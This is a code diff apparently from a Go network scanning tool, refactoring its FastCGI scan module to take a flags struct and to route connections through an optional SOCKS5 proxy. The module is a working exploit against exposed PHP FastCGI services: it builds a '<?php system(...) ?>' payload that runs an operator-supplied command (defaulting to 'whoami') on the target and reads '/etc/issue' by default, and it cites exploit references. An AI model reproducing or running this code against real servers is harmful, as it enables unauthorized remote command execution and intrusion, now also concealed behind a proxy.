@@ -19,22 +19,22 @@ import (
 //https://xz.aliyun.com/t/9544
 //https://github.com/wofeiwo/webcgi-exploits
 
-func FcgiScan(info *common.HostInfo) {
-	if common.IsBrute {
+func FcgiScan(info common.HostInfo, flags common.Flags) {
+	if flags.IsBrute {
 		return
 	}
 	url := "/etc/issue"
-	if common.Path != "" {
-		url = common.Path
+	if flags.Path != "" {
+		url = flags.Path
 	}
 	addr := fmt.Sprintf("%v:%v", info.Host, info.Ports)
 	var reqParams string
 	var cutLine = "-----ASDGTasdkk361363s-----\n"
 	switch {
-	case common.Command == "read":
+	case flags.Command == "read":
 		reqParams = ""
-	case common.Command != "":
-		reqParams = "<?php system('" + common.Command + "');die('" + cutLine + "');?>"
+	case flags.Command != "":
+		reqParams = "<?php system('" + flags.Command + "');die('" + cutLine + "');?>"
 	default:
 		reqParams = "<?php system('whoami');die('" + cutLine + "');?>"
 	}
@@ -55,7 +55,7 @@ func FcgiScan(info *common.HostInfo) {
 		env["REQUEST_METHOD"] = "GET"
 	}
 
-	fcgi, err := New(addr, common.Timeout)
+	fcgi, err := New(addr, flags)
 	defer func() {
 		if fcgi.rwc != nil {
 			fcgi.rwc.Close()
@@ -183,8 +183,8 @@ type FCGIClient struct {
 	keepAlive bool
 }
 
-func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
-	conn, err := common.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
+func New(addr string, flags common.Flags) (fcgi *FCGIClient, err error) {
+	conn, err := common.WrapperTcpWithTimeout("tcp", addr, common.Socks5{Address: flags.Socks5Proxy}, time.Duration(flags.Timeout)*time.Second)
 	fcgi = &FCGIClient{
 		rwc:       conn,
 		keepAlive: false,
